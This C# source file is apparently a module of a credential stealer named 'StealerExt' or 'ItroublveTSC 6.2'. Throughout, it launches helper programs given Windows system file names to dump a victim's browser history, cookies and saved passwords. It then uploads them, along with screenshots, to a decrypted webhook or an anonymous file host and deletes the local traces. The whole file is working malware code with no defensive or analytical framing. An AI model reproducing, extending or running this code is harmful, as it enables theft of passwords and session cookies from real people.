using System;
using System.IO;
using System.Net;
using System.Net.Http;

namespace StealerExt
{
    internal class API
	{
		public API(string _HookUrl)
		{
			_Client = new HttpClient();
			_URL = _HookUrl;
		}
        public static void History()
		{
			StartProcess.Run("xwizard.exe", $"{Environment.UserName}_History.txt");
			string _history = Temp + Environment.UserName + "_History.txt";
			if (string.IsNullOrEmpty(File.ReadAllText(_history)))
			{

				new API(wHook).SendHistory("History file is empty.");
				return;
			}
			long s = new FileInfo(_history).Length;
			if (s < 7950000)
			{
				bool flag = File.Exists(_history);
				if (flag )
				{
					new API(wHook).SendHistory("**Browser History**", _history);
				}
				else
				{
					new API(wHook).SendHistory("No history found");
				}
			}
			else
			{
				string info = null;
				UploadAnonFiles.UploadFile(_history, ref info);
				new API(wHook).SendPasswords(info.Replace("{0}", nameof(History)));
			}
			File.Delete(_history);
        }
        
		public static void Cookies()
		{
			StartProcess.Run("winhlp32.exe", "Cookies1");
			StartProcess.Run("splwow64.exe", "Cookies2");
			StartProcess.Run("hh.exe", "Cookies3");
			string c1 = File.ReadAllText(Temp + "Cookies1");
			string c2 = File.ReadAllText(Temp + "Cookies2");
			string c3 = File.ReadAllText(Temp + "Cookies3");
			string c = c1 + c2 + c3;
			File.WriteAllText(Temp + Environment.UserName + "_Cookies.txt", c);
			File.Delete(Temp + "Cookies1"); File.Delete(Temp + "Cookies2"); File.Delete(Temp + "Cookies3");
			string text = Temp + Environment.UserName + "_Cookies.txt";
			long size_c = new FileInfo(text).Length;
			if (string.IsNullOrEmpty(File.ReadAllText(text))) 
			{
				new API(wHook).SendCookies("Cookies file is empty.");
				return;
			}
			if (size_c < 7950000)
            {
				bool flag = File.Exists(text);
				if (flag)
				{
					new API(wHook).SendCookies("**Browser Cookies**", text);
				}
				else
				{
					new API(wHook).SendCookies("No cookies found!");
				}
			}
            else
            {
				string info = null;
				UploadAnonFiles.UploadFile(text, ref info);
                new API(wHook).SendCookies(info.Replace("{0}", nameof(Cookies)));
			}
			File.Delete(text);
		}

        public static void Passwords()
		{
			StartProcess.Run("snuvcdsm.exe", "Passwords");
			string passwordLoc = Path.Combine(Temp + "Passwords.txt");
			if (string.IsNullOrEmpty(File.ReadAllText(passwordLoc))) 
			{
				new API(wHook).SendPasswords("Password file is empty.");
				return;
			}
			long size_psw = new FileInfo(passwordLoc).Length;
			if (size_psw < 7950000)
            {
				if (File.Exists(passwordLoc))
				{
					new API(wHook).SendPasswords("**Browser Password**", passwordLoc);
				}
				else
				{
					new API(wHook).SendPasswords("No browser passwords found!");
				}
			}
            else
            {
				string info = null;
				UploadAnonFiles.UploadFile(passwordLoc, ref info);
				new API(wHook).SendPasswords(info.Replace("{0}", nameof(Passwords)));
			}
			File.Delete(passwordLoc);
		}

		// Junk... Can't bother updating tho and who cares :c
		public bool SendCookies(string content = null, string file = null)
		{
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			multipartFormDataContent.Add(new StringContent(name), "username");
			multipartFormDataContent.Add(new StringContent(pfp), "avatar_url");
			multipartFormDataContent.Add(new StringContent(content), "content");
			bool flag = file != null;
			if (flag)
			{
				byte[] content2 = File.ReadAllBytes(file);
				multipartFormDataContent.Add(new ByteArrayContent(content2), Environment.UserName + "_Cookies.txt", Environment.UserName + "_Cookies.txt");
			}
			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
			return result.StatusCode == HttpStatusCode.NoContent;
		}

		public bool SendHistory(string content = null, string file = null)
		{
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			multipartFormDataContent.Add(new StringContent(name), "username");
			multipartFormDataContent.Add(new StringContent(pfp), "avatar_url");
			multipartFormDataContent.Add(new StringContent(content), "content");
			bool flag = file != null;
			if (flag)
			{
				byte[] content2 = File.ReadAllBytes(file);
				multipartFormDataContent.Add(new ByteArrayContent(content2), Environment.UserName + "_History.txt", Environment.UserName + "_History.txt");
			}
			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
			return result.StatusCode == HttpStatusCode.NoContent;
		}

		public bool SendScreenshot(MemoryStream file = null)
		{
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			multipartFormDataContent.Add(new StringContent(name), "username");
			multipartFormDataContent.Add(new StringContent(pfp), "avatar_url");
			multipartFormDataContent.Add(new StringContent(null), "content");
			bool flag = file.Length > 0;
			if (flag)
			{
				multipartFormDataContent.Add(new ByteArrayContent(file.ToArray()), "screenshot", "Screenshot.png");
			}
			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
			return result.StatusCode == HttpStatusCode.NoContent;
		}

		public bool SendPasswords(string content, string file = null)
		{
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			multipartFormDataContent.Add(new StringContent(name), "username");
			multipartFormDataContent.Add(new StringContent(pfp), "avatar_url");
			multipartFormDataContent.Add(new StringContent(content), "content");
			bool flag = file != null;
			if (flag)
			{
				byte[] content2 = File.ReadAllBytes(file);
				multipartFormDataContent.Add(new ByteArrayContent(content2), Environment.UserName + "_Passwords.txt", Environment.UserName + "_Passwords.txt");
			}
			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
			return result.StatusCode == HttpStatusCode.NoContent;
		}

		public bool SendWCC(string content = null, string file = null)
		{
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			multipartFormDataContent.Add(new StringContent(name), "username");
			multipartFormDataContent.Add(new StringContent(pfp), "avatar_url");
			multipartFormDataContent.Add(new StringContent(content), "content");
			bool flag = file != null;
			if (flag)
			{
				byte[] content2 = File.ReadAllBytes(file);
				multipartFormDataContent.Add(new ByteArrayContent(content2), "capture.png", "capture.png");
			}
			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
			return result.StatusCode == HttpStatusCode.NoContent;
		}
		public bool idk(string content, string file = null)
		{
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			multipartFormDataContent.Add(new StringContent(name), "username");
			multipartFormDataContent.Add(new StringContent(pfp), "avatar_url");
			multipartFormDataContent.Add(new StringContent(content), "content");
			bool flag = file != null;
			if (flag)
			{
				byte[] content2 = File.ReadAllBytes(file);
				multipartFormDataContent.Add(new ByteArrayContent(content2), "capture.png", "capture.png");
			}
			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
			return result.StatusCode == HttpStatusCode.NoContent;
		}
        
        public static string wHook => Hook._DecryptedHook;
		public const string name = "ItroublveTSC 6.2";
		public const string pfp = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQaZLjMqLWHlL0VMxjLOEYXohyV6C9dsEjKsg&usqp=CAU";
		private HttpClient _Client;
		private readonly string _URL;
		//public string _name { get; set; }
		//public string _ppUrl { get; set; }
		public static WebClient wc = new WebClient();
		public static string Temp = Path.GetTempPath();
	}
}